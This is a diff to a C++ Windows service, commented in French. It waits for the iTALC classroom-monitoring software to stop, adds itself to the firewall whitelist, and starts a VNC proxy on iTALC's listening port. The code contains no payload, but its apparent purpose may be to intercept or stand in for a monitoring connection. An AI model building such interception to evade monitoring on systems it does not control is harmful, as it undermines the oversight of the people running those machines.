@@ -4,6 +4,7 @@
 #include "serviceCore.h"
 #include "watchdog.h"
 #include "net.h"
+#include "vncProxy.h"
 
 /* ServiceCore::ServiceCore: Constructeur qui initialise toutes les valeurs
  */
@@ -22,11 +23,14 @@ void ServiceCore::start(){
 	std::cout << "[ServiceCore] Starting..." << std::endl;
 	// On initialise la stack réseau de window
 	initWSocket();
+
 	// On démare le watchdog Italc
 	this->m_watchdogThread = italcWatchdogThread(this);
+
 	// On se whitelist dans le firewall
 	whitelistFirewall();
 	std::cout << "[ServiceCore] Firewall configured" << std::endl;
+
 	// On écoute sur le socket
 	// On attend avant que Italc soit arrêté
 	while(this->m_italcSleep == 0) Sleep(50);
@@ -36,6 +40,10 @@ void ServiceCore::start(){
 		this->kill();
 	}
 	std::cout << "[ServiceCore] Listening Socket on TCP:" << ITALC_PORT << " established." << std::endl;
+
+	// On démare le proxy
+	this->m_vncProxy = new VncProxy(this->m_italcListeningSocket);
+	this->m_vncProxy->startAcceptingThread();
 }
 
 /* ServiceCore::stop: Arrête les différents composant du service
@@ -45,6 +53,9 @@ void ServiceCore::stop(){
 	std::cout << "[ServiceCore] Stopping..." << std::endl;
 	// On arrète le watchdog Italc
 	CloseHandle(this->m_watchdogThread);
+	// On arrête le proxy
+	this->m_vncProxy->stopAcceptingThread();
+	delete this->m_vncProxy;
 	// On ferme le socket d'écoute
 	closesocket(this->m_italcListeningSocket);
 }
